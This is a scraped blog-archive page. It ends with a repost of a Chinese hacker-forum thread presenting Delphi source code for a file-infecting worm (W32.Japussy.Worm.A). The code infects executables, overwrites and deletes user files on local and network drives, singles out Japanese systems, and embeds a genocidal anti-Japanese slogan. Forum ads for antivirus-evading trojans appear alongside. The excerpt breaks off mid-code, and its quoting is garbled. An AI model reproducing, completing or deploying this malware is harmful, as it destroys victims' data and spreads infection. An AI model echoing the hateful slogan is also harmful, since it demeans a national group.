<li><a href="http://hi.baidu.com/spyagent" target="_blank"><img src="&quot;╰☆Cfan☆╮&quot;" alt="╰☆Cfan☆╮"></a> <a href="http://hi.baidu.com/spyagent" title="╰☆Cfan☆╮" target="_blank">╰☆Cfan☆╮</a></li>
</ul>
<p>8月3日</p>
<ul>
<li><a href="http://hi.baidu.com/tlnko0o" target="_blank"><img src="&quot;tlnko0o&quot;" alt="tlnko0o"></a> <a href="http://hi.baidu.com/tlnko0o" title="tlnko0o" target="_blank">tlnko0o</a></li>
</ul>
<p>6月27日</p>
<ul>
<li><a href="http://hi.baidu.com/crxzkusdrmbgktd" target="_blank"><img src="&quot;江湖大虾仁&quot;" alt="江湖大虾仁"></a> <a href="http://hi.baidu.com/crxzkusdrmbgktd" title="江湖大虾仁" target="_blank">江湖大虾仁</a></li>
</ul>
<p>5月8日</p>
<ul>
<li><a href="http://hi.baidu.com/autoliyang" target="_blank"><img src="&quot;autoliyang&quot;" alt="autoliyang"></a> <a href="http://hi.baidu.com/autoliyang" title="autoliyang" target="_blank">autoliyang</a></li>
</ul>
<p>5月2日</p>
<ul>
<li><a href="http://hi.baidu.com/j4r377" target="_blank"><img src="&quot;★屠龙★&quot;" alt="★屠龙★"></a> <a href="http://hi.baidu.com/j4r377" title="★屠龙★" target="_blank">★屠龙★</a></li>
</ul>
<p>1月28日</p>
<ul>
<li><a href="http://hi.baidu.com/zhengshixin163" target="_blank"><img src="&quot;zhengshixin163&quot;" alt="zhengshixin163"></a> <a href="http://hi.baidu.com/zhengshixin163" title="zhengshixin163" target="_blank">zhengshixin163</a></li>
</ul>
<p>1月20日</p>
<ul>
<li><a href="http://hi.baidu.com/liufeng3344" target="_blank"><img src="&quot;love_liufeng&quot;" alt="love_liufeng"></a> <a href="http://hi.baidu.com/liufeng3344" title="love_liufeng" target="_blank">love_liufeng</a></li>
</ul>
<p>12月29日</p>
<ul>
<li><a href="http://hi.baidu.com/90hback" target="_blank"><img src="&quot;月_清晖&quot;" alt="月_清晖"></a> <a href="http://hi.baidu.com/90hback" title="月_清晖" target="_blank">月_清晖</a></li>
</ul>
<p>12月25日</p>
<p>评论
 同时评论给 </p>
<p> 同时评论给原文作者 </p>
<p><a href=""> 发布 </a></p>
<p>500/0</p>
<p><a href="http://hi.baidu.com/go/check?portrait=90d466616b65da2b" title="angelc0de" target="_blank"><img src="" alt="angelc0de"></a><a href="http://hi.baidu.com/go/check?portrait=90d466616b65da2b" title="angelc0de" target="_blank">angelc0de</a>回复<a href="http://hi.baidu.com/go/check?portrait=b67166616b65f303" title="vexs" target="_blank">vexs</a></p>
<p>幸亏vexs的分析，否则还真不知道呢，学习了。 </p>
<p>2012-10-25 17:58
<a href="">回复</a></p>
<p><a href="http://hi.baidu.com/go/check?portrait=b67166616b65f303" title="vexs" target="_blank"><img src="" alt="vexs"></a><a href="http://hi.baidu.com/go/check?portrait=b67166616b65f303" title="vexs" target="_blank">vexs</a>回复<a href="http://hi.baidu.com/go/check?portrait=80f666616b651b09" title="park4park" target="_blank">park4park</a></p>
<p>请仔细读内容，然后再做判断。 </p>
<p>2012-10-24 15:38
<a href="">回复</a>
<a href="http://hi.baidu.com/go/check?portrait=b67166616b65f303" title="vexs" target="_blank"><img src="" alt="vexs"></a><a href="http://hi.baidu.com/go/check?portrait=b67166616b65f303" title="vexs" target="_blank">vexs</a>回复<a href="http://hi.baidu.com/go/check?portrait=90d466616b65da2b" title="angelc0de" target="_blank">angelc0de</a></p>
<p>在虚拟机里搞就行了。 </p>
<p>2012-10-24 15:37
<a href="">回复</a></p>
<p><a href="http://hi.baidu.com/go/check?portrait=80f666616b651b09" title="park4park" target="_blank"><img src="" alt="park4park"></a><a href="http://hi.baidu.com/go/check?portrait=80f666616b651b09" target="_blank">park4park</a>安装失败，给挂了马了吗 </p>
<p>2012-10-21 08:08
<a href="">回复</a>
<a href="http://hi.baidu.com/go/check?portrait=90d466616b65da2b" title="angelc0de" target="_blank"><img src="" alt="angelc0de"></a><a href="http://hi.baidu.com/go/check?portrait=90d466616b65da2b" target="_blank">angelc0de</a>呵呵，幸亏当时没安装啊， </p>
<p>2012-10-14 14:33
<a href="">回复</a></p>
<p><a href="http://hi.baidu.com/go/check?portrait=478b66616b653d24" title="xoo_xxoo" target="_blank"><img src="" alt="xoo_xxoo"></a><a href="http://hi.baidu.com/go/check?portrait=478b66616b653d24" title="xoo_xxoo" target="_blank">xoo_xxoo</a>回复<a href="http://hi.baidu.com/go/check?portrait=b67166616b65f303" title="vexs" target="_blank">vexs</a></p>
<p>呵呵 </p>
<p>2012-10-09 13:13
<a href="">回复</a>
<a href="http://hi.baidu.com/go/check?portrait=b67166616b65f303" title="vexs" target="_blank"><img src="" alt="vexs"></a><a href="http://hi.baidu.com/go/check?portrait=b67166616b65f303" title="vexs" target="_blank">vexs</a>回复<a href="http://hi.baidu.com/go/check?portrait=478b66616b653d24" title="xoo_xxoo" target="_blank">xoo_xxoo</a></p>
<p>有时候生活就是这样。 </p>
<p>2012-10-07 00:14
<a href="">回复</a></p>
<p><a href="http://hi.baidu.com/go/check?portrait=478b66616b653d24" title="xoo_xxoo" target="_blank"><img src="" alt="xoo_xxoo"></a><a href="http://hi.baidu.com/go/check?portrait=478b66616b653d24" target="_blank">xoo_xxoo</a>犀利哥 </p>
<p>2012-09-29 21:27
<a href="">回复</a></p>
<p><a href="">收起</a>|<a href="">查看更多</a></p>
<p><a href="http://help.baidu.com/question?prod_en=hi" target="_blank">帮助中心</a> | <a href="http://tieba.baidu.com/p/1781683739" target="_blank">空间客服</a> | <a href="http://tousu.baidu.com/hi/add" target="_blank">投诉中心</a> | <a href="http://www.baidu.com/search/hi_contract.html" target="_blank">空间协议</a></p>
<p>©2013 Baidu
<a href="http://hi.baidu.com/pub/show/createmusic" title="发布音乐" target="_blank">a</a></p>
<p><a href="http://hi.baidu.com/robinchia" title="我的主页" target="_blank">b</a>
<a href="http://hi.baidu.com/home" title="首页" target="_blank">c</a></p>
<p><a href="http://hi.baidu.com/pub/show/createtext" title="发布文字" target="_blank">d</a>
<a href="http://hi.baidu.com/pub/show/createpic" title="发布图片" target="_blank">e</a></p>
<p><a href="http://hi.baidu.com/pub/show/createvideo" title="发布视频" target="_blank">f</a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/X/">X</a></li></span></span> | <span class="tags">Tagged <a href="/tags/X/" class="label label-primary">X</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-X--这个世界是一点懒都偷不了的！_Vexs_百度空间/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-X--这个世界是一点懒都偷不了的！_Vexs_百度空间" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-X--熊猫烧香源代码-【编程魔方】/">熊猫烧香源代码 </a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-X--熊猫烧香源代码-【编程魔方】/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-">熊猫烧香源代码 - 【编程魔方】</h1>
<h2 id="-x-http-bbs-hackerxfiles-net-x-"><a href="http://bbs.hackerxfiles.net/" title="黑客X档案官方论坛" target="_blank"><img src="" alt="黑客X档案官方论坛"></a></h2>
<p><a href="http://bbs.hackerxfiles.net/register.php" target="_blank">注册</a> <a href="http://bbs.hackerxfiles.net/logging.php?action=login" target="_blank">登录</a></p>
<p><a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3d3dy5kb3Nib3kuY29tL3dsYXFweC5odG1s" target="_blank"><img src="" alt=""></a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/" target="_blank">论坛首页</a></li>
<li><a href="http://bbs.hackerxfiles.net/search.php" target="_blank">站内搜索</a></li>
<li><a href="http://bbs.hackerxfiles.net/task.php" target="_blank">论坛任务</a></li>
<li><a href="http://post.hackerxfiles.net/" target="_blank">邮购查询</a></li>
<li><a href="http://ip.hackerxfiles.net/" target="_blank">远控上线</a></li>
<li><a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3d3dy5nb3RvcmVhZC5jb20vbWFnLzEzMDEzLw==" target="_blank">在线销售</a></li>
<li><a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3d3dy5jcHJveHkuY24vd2ViL2hhY2tlcnhmaWxlcy5hc3A=" target="_blank">在线代理</a></li>
<li><a href="http://bbs.hackerxfiles.net/faq.php?action=credits" target="_blank">积分说明</a></li>
<li><a href="http://bbs.hackerxfiles.net/faq.php" target="_blank">新手帮助</a>
<a href="http://bbs.hackerxfiles.net/" target="_blank">黑客X档案官方论坛</a> » <a href="http://bbs.hackerxfiles.net/forum-13-1.html" target="_blank">【编程魔方】</a> » 熊猫烧香源代码</li>
</ul>
<p><strong>1</strong><a href="http://bbs.hackerxfiles.net/thread-375697-2-1.html" target="_blank">2</a><a href="http://bbs.hackerxfiles.net/thread-375697-3-1.html" target="_blank">3</a><a href="http://bbs.hackerxfiles.net/thread-375697-4-1.html" target="_blank">4</a><a href="http://bbs.hackerxfiles.net/thread-375697-2-1.html" target="_blank">下一页</a><a href="http://bbs.hackerxfiles.net/forum-13-1.html" target="_blank">返回列表</a> <a href="http://bbs.hackerxfiles.net/post.php?action=reply&amp;fid=13&amp;tid=375697" target="_blank">回复</a> <a href="http://bbs.hackerxfiles.net/post.php?action=newthread&amp;fid=13" target="_blank">发帖</a></p>
<ul>
<li><a href="http://bbs.hackerxfiles.net/post.php?action=newthread&amp;fid=13" target="_blank">发新话题</a></li>
<li><a href="http://bbs.hackerxfiles.net/post.php?action=newthread&amp;fid=13&amp;special=1" target="_blank">发布投票</a></li>
<li><a href="http://bbs.hackerxfiles.net/post.php?action=newthread&amp;fid=13&amp;special=3" target="_blank">发布悬赏</a></li>
<li><a href="http://bbs.hackerxfiles.net/post.php?action=newthread&amp;fid=13&amp;special=5" target="_blank">发布辩论</a></li>
<li><a href="http://bbs.hackerxfiles.net/post.php?action=newthread&amp;fid=13&amp;special=4" target="_blank">发布活动</a></li>
<li><a href="http://bbs.hackerxfiles.net/post.php?action=newthread&amp;fid=13&amp;special=6" target="_blank">发布视频</a></li>
<li><p><a href="http://bbs.hackerxfiles.net/post.php?action=newthread&amp;fid=13&amp;special=2" target="_blank">发布商品</a>
<a href="http://bbs.hackerxfiles.net/space.php?uid=256130" target="_blank">张凯伦</a></p>
</li>
<li><p><a href="http://bbs.hackerxfiles.net/pm.php?action=new&amp;uid=256130" title="发短消息" target="_blank">发短消息</a></p>
</li>
<li><a href="http://bbs.hackerxfiles.net/my.php?item=buddylist&amp;newbuddyid=256130&amp;buddysubmit=yes" title="加为好友" target="_blank">加为好友</a></li>
</ul>
<p><a href="http://bbs.hackerxfiles.net/space-uid-256130.html" target="_blank">张凯伦</a> <em>当前离线</em>
<a href="http://bbs.hackerxfiles.net/space-uid-256130.html" title="查看详细资料" target="_blank"><img src="" alt="查看详细资料"></a>
<a href="http://bbs.hackerxfiles.net/space-uid-256130.html" target="_blank"><img src="" alt=""></a></p>
<p><em>学前班</em></p>
<p>帖子10 积分5 威望0 个 金币17 个 宣传0 个 注册时间2009-4-5 最后登录2009-8-27  <strong><a href="&quot;复制本帖链接&quot;"><em>1</em>楼</a></strong></p>
<p><a href="http://bbs.hackerxfiles.net/viewthread.php?action=printable&amp;tid=375697" target="_blank">打印</a></p>
<p>字体大小: tT</p>
<p><img src="" alt=""> <em>发表于 2009-8-7 11:55</em> | <a href="http://bbs.hackerxfiles.net/viewthread.php?tid=375697&amp;page=1&amp;authorid=256130" target="_blank">只看该作者</a></p>
<p><a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3NiYXBzcGwuMzMyMi5vcmcvb2trLmh0bWw=" target="_blank">承接免杀木马业务_出售各类免杀木马</a></p>
<p><a href="http://bbs.hackerxfiles.net/goto.php?url=aHR0cDovL3d3dy53b3JtLXguY29t" target="_blank"><img src="" alt=""></a></p>
<h1 id="-http-bbs-hackerxfiles-net-forumdisplay-php-fid-13-filter-type-typeid-1-"><a href="http://bbs.hackerxfiles.net/forumdisplay.php?fid=13&amp;filter=type&amp;typeid=1" target="_blank">[原创]</a> 熊猫烧香源代码</h1>
<p>program Japussy;
uses
Windows, SysUtils, Classes, Graphics, ShellAPI{, Registry};
const
HeaderSize = 82432;                 //病毒体的大小
IconOffset = $12EB8;               //PE文件主图标的偏移量
//在我的Delphi5 SP1上面编译得到的大小，其它版本的Delphi可能不同
//查找2800000020的十六进制字符串可以找到主图标的偏移量
{
HeaderSize = 38912;                 //Upx压缩过病毒体的大小
IconOffset = $92BC;                 //Upx压缩过PE文件主图标的偏移量
//Upx 1.24W 用法: upx -9 --8086 Japussy.exe
}
IconSize       = $2E8;                 //PE文件主图标的大小--744字节
IconTail       = IconOffset + IconSize; //PE文件主图标的尾部
ID           = $44444444;             //感染标记
//垃圾码，以备写入
Catchword = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;If a race need to be killed out, it must be Yamato. &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; +
            &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;If a country need to be destroyed, it must be Japan! &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; +
            &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;/<em>/</em>/<em> W32.Japussy.Worm.A /</em>/<em>/</em>&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;;
{$R /<em>.RES}
function RegisterServiceProcess(dwProcessID, dwType: Integer): Integer;
stdcall; external &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;Kernel32.dll&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;; //函数声明
var
TmpFile: string;
Si:         STARTUPINFO;
Pi:         PROCESS_INFORMATION;
IsJap:       Boolean = False; //日文操作系统标记
{ 判断是否为Win9x }
function IsWin9x: Boolean;
var
Ver: TOSVersionInfo;
begin
Result := False;
Ver.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
if not GetVersionEx(Ver) then
      Exit;
if (Ver.dwPlatformID = VER_PLATFORM_WIN32_WINDOWS) then //Win9x
      Result := True;
end;
{ 在流之间复制 }
procedure CopyStream(Src: TStream; sStartPos: Integer; Dst: TStream;
dStartPos: Integer; Count: Integer);
var
sCurPos, dCurPos: Integer;
begin
sCurPos := Src.Position;
dCurPos := Dst.Position;
Src.Seek(sStartPos, 0);
Dst.Seek(dStartPos, 0);
Dst.CopyFrom(Src, Count);
Src.Seek(sCurPos, 0);
Dst.Seek(dCurPos, 0);
end;
{ 将宿主文件从已感染的PE文件中分离出来，以备使用 }
procedure ExtractFile(FileName: string);
var
sStream, dStream: TFileStream;
begin
try
      sStream := TFileStream.Create(ParamStr(0), fmOpenRead or fmShareDenyNone);
try
        dStream := TFileStream.Create(FileName, fmCreate);
        try
        sStream.Seek(HeaderSize, 0); //跳过头部的病毒部分
        dStream.CopyFrom(sStream, sStream.Size - HeaderSize);
        finally
        dStream.Free;
        end;
      finally
        sStream.Free;
      end;
except
end;
end;
{ 填充STARTUPINFO结构 }
procedure FillStartupInfo(var Si: STARTUPINFO; State: Word);
begin
Si.cb := SizeOf(Si);
Si.lpReserved := nil;
Si.lpDesktop := nil;
Si.lpTitle := nil;
Si.dwFlags := STARTF_USESHOWWINDOW;
Si.wShowWindow := State;
Si.cbReserved2 := 0;
Si.lpReserved2 := nil;
end;
{ 发带毒邮件 }
procedure SendMail;
begin
//哪位仁兄愿意完成之？
end;
{ 感染PE文件 }
procedure InfectOneFile(FileName: string);
var
HdrStream, SrcStream: TFileStream;
IcoStream, DstStream: TMemoryStream;
iID: LongInt;
aIcon: TIcon;
Infected, IsPE: Boolean;
i: Integer;
Buf: array[0..1] of Char;
begin
try //出错则文件正在被使用，退出
      if CompareText(FileName, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;JAPUSSY.EXE&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) = 0 then //是自己则不感染
        Exit;
      Infected := False;
      IsPE       := False;
      SrcStream := TFileStream.Create(FileName, fmOpenRead);
      try
        for i := 0 to $108 do //检查PE文件头
        begin
        SrcStream.Seek(i, soFromBeginning);
        SrcStream.Read(Buf, 2);
        if (Buf[0] = /#80) and (Buf[1] = /#69) then //PE标记
        begin
          IsPE := True; //是PE文件
          Break;
        end;
        end;
        SrcStream.Seek(-4, soFromEnd); //检查感染标记
        SrcStream.Read(iID, 4);
        if (iID = ID) or (SrcStream.Size &lt; 10240) then //太小的文件不感染
        Infected := True;
      finally
        SrcStream.Free;
end;
      if Infected or (not IsPE) then //如果感染过了或不是PE文件则退出
        Exit;
      IcoStream := TMemoryStream.Create;
      DstStream := TMemoryStream.Create;
      try
        aIcon := TIcon.Create;
        try
        //得到被感染文件的主图标(744字节)，存入流
        aIcon.ReleaseHandle;
        aIcon.Handle := ExtractIcon(HInstance, PChar(FileName), 0);
        aIcon.SaveToStream(IcoStream);
        finally
        aIcon.Free;
        end;
        SrcStream := TFileStream.Create(FileName, fmOpenRead);
        //头文件
        HdrStream := TFileStream.Create(ParamStr(0), fmOpenRead or fmShareDenyNone);
        try
        //写入病毒体主图标之前的数据
        CopyStream(HdrStream, 0, DstStream, 0, IconOffset);
        //写入目前程序的主图标
        CopyStream(IcoStream, 22, DstStream, IconOffset, IconSize);
        //写入病毒体主图标到病毒体尾部之间的数据
        CopyStream(HdrStream, IconTail, DstStream, IconTail, HeaderSize - IconTail);
        //写入宿主程序
        CopyStream(SrcStream, 0, DstStream, HeaderSize, SrcStream.Size);
        //写入已感染的标记
        DstStream.Seek(0, 2);
        iID := $44444444;
        DstStream.Write(iID, 4);
        finally
        HdrStream.Free;
        end;
      finally
        SrcStream.Free;
        IcoStream.Free;
        DstStream.SaveToFile(FileName); //替换宿主文件
        DstStream.Free;
      end;
except;
end;
end;
{ 将目标文件写入垃圾码后删除 }
procedure SmashFile(FileName: string);
var
FileHandle: Integer;
i, Size, Mass, Max, Len: Integer;
begin
try
      SetFileAttributes(PChar(FileName), 0); //去掉只读属性
      FileHandle := FileOpen(FileName, fmOpenWrite); //打开文件
      try
        Size := GetFileSize(FileHandle, nil); //文件大小
        i := 0;
        Randomize;
        Max := Random(15); //写入垃圾码的随机次数
        if Max &lt; 5 then
        Max := 5;
        Mass := Size div Max; //每个间隔块的大小
        Len := Length(Catchword);
        while i &lt; Max do
        begin
        FileSeek(FileHandle, i /</em> Mass, 0); //定位
        //写入垃圾码，将文件彻底破坏掉
        FileWrite(FileHandle, Catchword, Len);
        Inc(i);
        end;
      finally
        FileClose(FileHandle); //关闭文件
      end;
      DeleteFile(PChar(FileName)); //删除之
except
end;
end;
{ 获得可写的驱动器列表 }
function GetDrives: string;
var
DiskType: Word;
D: Char;
Str: string;
i: Integer;
begin
for i := 0 to 25 do //遍历26个字母
begin
      D := Chr(i + 65);
      Str := D + &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;:\&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;;
      DiskType := GetDriveType(PChar(Str));
      //得到本地磁盘和网络盘
      if (DiskType = DRIVE<em>FIXED) or (DiskType = DRIVE_REMOTE) then
        Result := Result + D;
end;
end;
{ 遍历目录，感染和摧毁文件 }
procedure LoopFiles(Path, Mask: string);
var
i, Count: Integer;
Fn, Ext: string;
SubDir: TStrings;
SearchRec: TSearchRec;
Msg: TMsg;
function IsValidDir(SearchRec: TSearchRec): Integer;
begin
      if (SearchRec.Attr &lt;&gt; 16) and (SearchRec.Name &lt;&gt; &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) and
        (SearchRec.Name &lt;&gt; &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;..&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) then
        Result := 0 //不是目录
      else if (SearchRec.Attr = 16) and (SearchRec.Name &lt;&gt; &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) and
        (SearchRec.Name &lt;&gt; &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;..&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) then
        Result := 1 //不是根目录
      else Result := 2; //是根目录
end;
begin
if (FindFirst(Path + Mask, faAnyFile, SearchRec) = 0) then
begin
      repeat
        PeekMessage(Msg, 0, 0, 0, PM_REMOVE); //调整消息队列，避免引起怀疑
        if IsValidDir(SearchRec) = 0 then
        begin
        Fn := Path + SearchRec.Name;
        Ext := UpperCase(ExtractFileExt(Fn));
        if (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.EXE&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.SCR&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) then
        begin
          InfectOneFile(Fn); //感染可执行文件<br>        end
        else if (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.HTM&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.HTML&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.ASP&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) then
        begin
          //感染HTML和ASP文件，将Base64编码后的病毒写入
          //感染浏览此网页的所有用户
          //哪位大兄弟愿意完成之？
        end
        else if Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.WAB&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; then //Outlook地址簿文件
        begin
          //获取Outlook邮件地址
        end
        else if Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.ADC&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; then //Foxmail地址自动完成文件
        begin
          //获取Foxmail邮件地址
        end
        else if Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;IND&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39; then //Foxmail地址簿文件
        begin
          //获取Foxmail邮件地址
end
        else
        begin
          if IsJap then //是倭文操作系统
          begin
            if (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.DOC&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.XLS&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.MDB&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or
            (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.MP3&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.RM&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.RA&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or
            (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.WMA&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.ZIP&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.RAR&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or
            (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.MPEG&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.ASF&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.JPG&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or
            (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.JPEG&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.GIF&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or (Ext = &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.SWF&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;) or
